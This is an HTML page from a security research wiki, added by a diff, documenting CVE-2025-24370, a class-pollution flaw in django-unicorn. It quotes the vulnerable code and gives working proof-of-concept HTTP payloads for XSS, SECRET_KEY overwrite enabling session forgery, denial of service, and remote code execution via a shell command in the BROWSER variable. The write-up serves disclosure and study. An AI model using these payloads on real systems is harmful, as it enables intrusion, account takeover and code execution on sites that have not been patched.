@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>django-unicorn | Python Class Pollution</title>
+    <link rel="stylesheet" href="/wiki/css/wiki.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+    <div class="wiki-layout">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <a href="/wiki/docs/">Class Pollution Wiki</a>
+            </div>
+            <ul class="sidebar-nav">
+
+
+    <li>
+        <a href="/wiki/docs/" >Overview</a>
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/taxonomy/" >Taxonomy</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/taxonomy/atomics/" >Get &amp; Set Atomics</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/primitives/" >Pollution Primitives</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/targets/" >Pollution Targets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/targets/classes/" >Classes</a></li>
+            
+            <li><a href="/wiki/docs/targets/modules/" >Modules</a></li>
+            
+            <li><a href="/wiki/docs/targets/functions/" >Functions</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/gadgets/" >Gadgets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/gadgets/rce/" >RCE Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/xss/" >XSS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/auth-bypass/" >Auth Bypass Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/tool/" >Tool</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/tool/pyrl/" >Pyrl</a></li>
+            
+            <li><a href="/wiki/docs/tool/polluter/" >Polluter</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/collection/" >Showcases &amp; CVEs</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/collection/catalog/" >Catalog</a></li>
+            
+            <li><a href="/wiki/docs/collection/showcases/" >Showcase Walkthroughs</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/defense/" >Defense</a>
+        
+    </li>
+    
+
+</ul>
+
+        </nav>
+        <main class="content">
+            
+<article>
+    <h1 id="django-unicorn-cve-2025-24370">django-unicorn (CVE-2025-24370)</h1>
+<p><strong>django-unicorn</strong> is a reactive component framework for Django (2.4K stars) that synchronizes client-side state with server-side Python objects over HTTP messages.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Field</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Repository</td>
+          <td><a href="https://github.com/adamghill/django-unicorn">adamghill/django-unicorn</a></td>
+      </tr>
+      <tr>
+          <td>Version</td>
+          <td>0.61.0</td>
+      </tr>
+      <tr>
+          <td>CVE</td>
+          <td><a href="https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43">CVE-2025-24370</a></td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Agnostic-Get × Dual-Set</td>
+      </tr>
+      <tr>
+          <td>Input</td>
+          <td>Remote (HTTP POST)</td>
+      </tr>
+      <tr>
+          <td>Consequences</td>
+          <td>RCE, XSS, DoS, Authentication Bypass</td>
+      </tr>
+      <tr>
+          <td>Status</td>
+          <td>Fixed in 0.62.0</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="summary">Summary</h2>
+<p>Django-Unicorn is vulnerable to a class pollution vulnerability arising from its core <code>set_property_value</code> function, which can be remotely triggered by users by crafting appropriate component requests. The vulnerability allows arbitrary changes to the Python runtime status, leading to Cross-Site Scripting (XSS), Denial of Service (DoS), Authentication Bypass, and Remote Code Execution in virtually every Django-Unicorn-based application.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The sink is <code>set_property_value</code> in <code>django_unicorn/views/action_parsers/utils.py</code>. It receives a dotted <code>property_name</code> directly from the JSON body of a component request:</p>
+<p><a href="https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/views/action_parsers/utils.py#L10"><code>django_unicorn/views/action_parsers/utils.py</code></a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_property_value</span>(component, property_name, property_value) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    property_name_parts <span style="color:#f92672">=</span> property_name<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)
+</span></span><span style="display:flex;"><span>    component_or_field <span style="color:#f92672">=</span> component
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> idx, property_name_part <span style="color:#f92672">in</span> enumerate(property_name_parts):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hasattr(component_or_field, property_name_part):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> idx <span style="color:#f92672">==</span> len(property_name_parts) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>                setattr(component_or_field, property_name_part, property_value)
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                component_or_field <span style="color:#f92672">=</span> getattr(component_or_field, property_name_part)
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> isinstance(component_or_field, dict):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> idx <span style="color:#f92672">==</span> len(property_name_parts) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>                component_or_field[property_name_part] <span style="color:#f92672">=</span> property_value
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                component_or_field <span style="color:#f92672">=</span> component_or_field[property_name_part]
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> isinstance(component_or_field, (QuerySet, list)):
+</span></span><span style="display:flex;"><span>            property_name_part_int <span style="color:#f92672">=</span> int(property_name_part)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> idx <span style="color:#f92672">==</span> len(property_name_parts) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>                component_or_field[property_name_part_int] <span style="color:#f92672">=</span> property_value
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                component_or_field <span style="color:#f92672">=</span> component_or_field[property_name_part_int]
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><p>The function performs both <code>getattr</code> and <code>__getitem__</code> for resolution (Agnostic-Get) and both <code>setattr</code> and <code>__setitem__</code> for the final write (Dual-Set). There is no check for dunder-prefixed path segments.</p>
+<p>This functionality is triggered via component requests by specifying the request type as <code>syncInput</code>:</p>
+<pre tabindex="0"><code>POST /unicorn/message/COMPONENT_NAME
+
+{
+    &#34;id&#34;: 123,
+    &#34;actionQueue&#34;: [
+        {
+            &#34;type&#34;: &#34;syncInput&#34;,
+            &#34;payload&#34;: {
+                &#34;name&#34;: &#34;DOTTED_PATH&#34;,
+                &#34;value&#34;: &#34;ASSIGNED_VALUE&#34;
+            }
+        }
+    ],
+    &#34;data&#34;: {...},
+    &#34;epoch&#34;: &#34;123&#34;,
+    &#34;checksum&#34;: &#34;XXXX&#34;
+}
+</code></pre><p>By setting <code>property_name</code> to a path like <code>__init__.__globals__</code>, the component context changes to the global context of the component module, allowing modification of any global objects including variables, instances, classes, and functions of any module in the dependency chain.</p>
+<h2 id="poc">PoC</h2>
+<h3 id="consequence-1-reflected-xss-bs4-html-sanitizer-overwrite">Consequence 1: Reflected XSS (bs4 HTML Sanitizer Overwrite)</h3>
+<p>Django-Unicorn uses the <code>EntitySubstitution</code> rule from BeautifulSoup to sanitize HTML in template responses. This rule is stored in a global dictionary that can be polluted.</p>
+<pre tabindex="0"><code>POST /unicorn/message/todo HTTP/1.1
+
+{
+  &#34;id&#34;: 123,
+  &#34;actionQueue&#34;: [
+    {
+      &#34;type&#34;: &#34;syncInput&#34;,
+      &#34;payload&#34;: {
+        &#34;name&#34;: &#34;__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.&lt;&#34;,
+        &#34;value&#34;: &#34;&lt;img/src=1 onerror=alert(&#39;bs4_html_entity_bypass&#39;)&gt;&#34;
+      }
+    }
+  ],
+  &#34;data&#34;: {&#34;task&#34;: &#34;&#34;, &#34;tasks&#34;: []},
+  &#34;epoch&#34;: &#34;123&#34;,
+  &#34;checksum&#34;: &#34;XXX&#34;
+}
+</code></pre><p><strong>Effect</strong>: The sanitizer&rsquo;s <code>&lt;</code> entity value is replaced with an XSS payload. Whenever a template response renders a <code>&lt;</code> in cleartext, it is converted to the payload, leading to reflected XSS for all users.</p>
+<hr>
+<h3 id="consequence-2-stored-xss-django-json-script-sanitizer-bypass">Consequence 2: Stored XSS (Django JSON Script Sanitizer Bypass)</h3>
+<p>Django-Unicorn always includes a script tag in the webpage where a <code>NAME</code> value is dynamically extracted from the <code>MORPHER_NAMES</code> and <code>DEFAULT_MORPHER_NAME</code> variables in the settings module. Django by default escapes special characters into unicode sequences via the <code>_json_script_escapes</code> variable. By clearing this sanitizer and polluting the settings, we achieve stored XSS.</p>
+<pre tabindex="0"><code>POST /unicorn/message/todo HTTP/1.1
+
+{
+  &#34;id&#34;: &#34;3gpDSUcxzs1&#34;,
+  &#34;data&#34;: {&#34;task&#34;: &#34;&#34;, &#34;tasks&#34;: []},
+  &#34;checksum&#34;: &#34;XXX&#34;,
+  &#34;actionQueue&#34;: [
+    {
+      &#34;type&#34;: &#34;syncInput&#34;,
+      &#34;payload&#34;: {
+        &#34;name&#34;: &#34;__init__.__globals__.sys.modules.django_unicorn.settings.MORPHER_NAMES&#34;,
+        &#34;value&#34;: [&#34;&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;]
+      }
+    },
+    {
+      &#34;type&#34;: &#34;syncInput&#34;,
+      &#34;payload&#34;: {
+        &#34;name&#34;: &#34;__init__.__globals__.sys.modules.django_unicorn.settings.DEFAULT_MORPHER_NAME&#34;,
+        &#34;value&#34;: &#34;&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;
+      }
+    },
+    {
+      &#34;type&#34;: &#34;syncInput&#34;,
+      &#34;payload&#34;: {
+        &#34;name&#34;: &#34;__init__.__globals__.sys.modules.django.utils.html._json_script_escapes&#34;,
+        &#34;value&#34;: {}
+      }
+    }
+  ],
+  &#34;epoch&#34;: 1737318956605,
+  &#34;hash&#34;: &#34;jWGuTFzy&#34;
+}
+</code></pre><p><strong>Effect</strong>: The attacker&rsquo;s script is injected into all pages served to all users. This is a universal stored XSS that persists for the lifetime of the process.</p>
+<hr>
+<h3 id="consequence-3-stored-xss-django-error-page-overwrite">Consequence 3: Stored XSS (Django Error Page Overwrite)</h3>
+<p>Django stores its error page source code in the global variable <code>ERROR_PAGE_TEMPLATE</code> at <code>django/views/defaults.py</code>. By polluting this variable, any user triggering an error (e.g., accessing a nonexistent resource) will execute the attacker&rsquo;s payload.</p>
+<pre tabindex="0"><code>POST /unicorn/message/todo HTTP/1.1
+
+{
+  &#34;id&#34;: 123,
+  &#34;actionQueue&#34;: [
+    {
+      &#34;type&#34;: &#34;syncInput&#34;,
+      &#34;payload&#34;: {
+        &#34;name&#34;: &#34;__init__.__globals__.sys.modules.django.views.defaults.ERROR_PAGE_TEMPLATE&#34;,
+        &#34;value&#34;: &#34;&lt;html&gt;&lt;script&gt;alert(&#39;error page pollution&#39;)&lt;/script&gt;&lt;/html&gt;&#34;
+      }
+    }
+  ],
+  &#34;data&#34;: {&#34;task&#34;: &#34;&#34;, &#34;tasks&#34;: []},
+  &#34;epoch&#34;: &#34;123&#34;,
+  &#34;checksum&#34;: &#34;XXX&#34;
+}
+</code></pre><p><strong>Effect</strong>: All Django error pages (404, 500, etc.) now serve the attacker&rsquo;s script to every user.</p>
+<hr>
+<h3 id="consequence-4-authentication-bypass-secret_key-overwrite">Consequence 4: Authentication Bypass (SECRET_KEY Overwrite)</h3>
+<p>Django&rsquo;s <code>SECRET_KEY</code> is used to sign and verify session cookies and other security mechanisms. By polluting its runtime value, an attacker can forge session cookies to log in as any user.</p>
+<pre tabindex="0"><code>POST /unicorn/message/todo HTTP/1.1
+
+{
+  &#34;id&#34;: 123,
+  &#34;actionQueue&#34;: [
+    {
+      &#34;type&#34;: &#34;syncInput&#34;,
+      &#34;payload&#34;: {
+        &#34;name&#34;: &#34;__init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY&#34;,
+        &#34;value&#34;: &#34;test&#34;
+      }
+    }
+  ],
+  &#34;data&#34;: {&#34;task&#34;: &#34;&#34;, &#34;tasks&#34;: []},
+  &#34;epoch&#34;: &#34;123&#34;,
+  &#34;checksum&#34;: &#34;XXX&#34;
+}
+</code></pre><p><strong>Effect</strong>: The attacker now knows the signing secret used for session cookies, CSRF tokens, and password reset links. They can forge a session cookie for any user (including superusers) offline.</p>
+<hr>
+<h3 id="consequence-5-dos-decorator-overwrite">Consequence 5: DoS (Decorator Overwrite)</h3>
+<p>The <code>timed</code> decorator is used to wrap many important functions in django-unicorn, such as <code>_call_method_name</code>. By polluting it to a string, all decorated function calls become uncallable.</p>
+<pre tabindex="0"><code>POST /unicorn/message/todo HTTP/1.1
+
+{
+  &#34;id&#34;: 123,
+  &#34;actionQueue&#34;: [
+    {
+      &#34;type&#34;: &#34;syncInput&#34;,
+      &#34;payload&#34;: {
+        &#34;name&#34;: &#34;__init__.__globals__.timed&#34;,
+        &#34;value&#34;: &#34;X&#34;
+      }
+    }
+  ],
+  &#34;data&#34;: {&#34;task&#34;: &#34;&#34;, &#34;tasks&#34;: []},
+  &#34;epoch&#34;: &#34;123&#34;,
+  &#34;checksum&#34;: &#34;XXX&#34;
+}
+</code></pre><p><strong>Effect</strong>: The backend crashes on any subsequent function call that uses the <code>timed</code> decorator, resulting in complete denial of service.</p>
+<hr>
+<h3 id="consequence-6-rce-location_cache--browser-environment-variable">Consequence 6: RCE (location_cache + BROWSER Environment Variable)</h3>
+<p>By polluting the <code>location_cache</code> object, attackers achieve arbitrary module importation. Combined with polluting the <code>BROWSER</code> OS environment variable, this leads to remote code execution when the <code>antigravity</code> module is imported (which calls <code>webbrowser.open()</code>, which reads <code>BROWSER</code> and executes it).</p>
+<p><strong>Step 1</strong>: Pollute <code>location_cache</code> to trigger <code>antigravity</code> module import on next request:</p>
+<pre tabindex="0"><code>POST /unicorn/message/todo HTTP/1.1
+
+{
+  &#34;id&#34;: &#34;E5FBWqME&#34;,
+  &#34;data&#34;: {&#34;task&#34;: &#34;&#34;, &#34;tasks&#34;: []},
+  &#34;checksum&#34;: &#34;XvvsDQXX&#34;,
+  &#34;actionQueue&#34;: [
+    {
+      &#34;type&#34;: &#34;syncInput&#34;,
+      &#34;payload&#34;: {
+        &#34;name&#34;: &#34;__init__.__globals__.location_cache._Cache__data.todo&#34;,
+        &#34;value&#34;: [&#34;antigravity&#34;, &#34;any&#34;]
+      }
+    },
+    {
+      &#34;type&#34;: &#34;callMethod&#34;,
+      &#34;payload&#34;: {&#34;name&#34;: &#34;add&#34;}
+    }
+  ],
+  &#34;epoch&#34;: 1746680343776,
+  &#34;hash&#34;: &#34;CG5pMDxc&#34;
+}
+</code></pre><p><strong>Step 2</strong>: Pollute <code>BROWSER</code> environment variable with the command injection payload:</p>
+<pre tabindex="0"><code>POST /unicorn/message/todo HTTP/1.1
+
+{
+  &#34;id&#34;: &#34;E5FBWqME&#34;,
+  &#34;data&#34;: {&#34;task&#34;: &#34;&#34;, &#34;tasks&#34;: []},
+  &#34;checksum&#34;: &#34;XvvsDQXX&#34;,
+  &#34;actionQueue&#34;: [
+    {
+      &#34;type&#34;: &#34;syncInput&#34;,
+      &#34;payload&#34;: {
+        &#34;name&#34;: &#34;__init__.__globals__.sys.modules.os.environ&#34;,
+        &#34;value&#34;: {&#34;BROWSER&#34;: &#34;/bin/sh -c \&#34;touch /tmp/pwned\&#34; #%s&#34;}
+      }
+    },
+    {
+      &#34;type&#34;: &#34;callMethod&#34;,
+      &#34;payload&#34;: {&#34;name&#34;: &#34;add&#34;}
+    }
+  ],
+  &#34;epoch&#34;: 1746680343776,
+  &#34;hash&#34;: &#34;CG5pMDxc&#34;
+}
+</code></pre><p><strong>Effect</strong>: Arbitrary shell command execution as the Django process user.</p>
+<h2 id="impact">Impact</h2>
+<p>Django-Unicorn is widely used as a reactive component framework. Any remote user of a django-unicorn application can exploit this vulnerability to achieve XSS, DoS, authentication bypass, and RCE. The component request endpoint is accessible to any authenticated user, making this a remote-triggerable vulnerability with critical severity.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p><a href="https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/django-unicorn/poc"><code>cp-collection/django-unicorn/poc/</code></a>
+— runnable exploit environment with <code>run.sh</code> and <code>requirements.txt</code>.</p>
+
+</article>
+
+        </main>
+    </div>
+</body>
+</html>
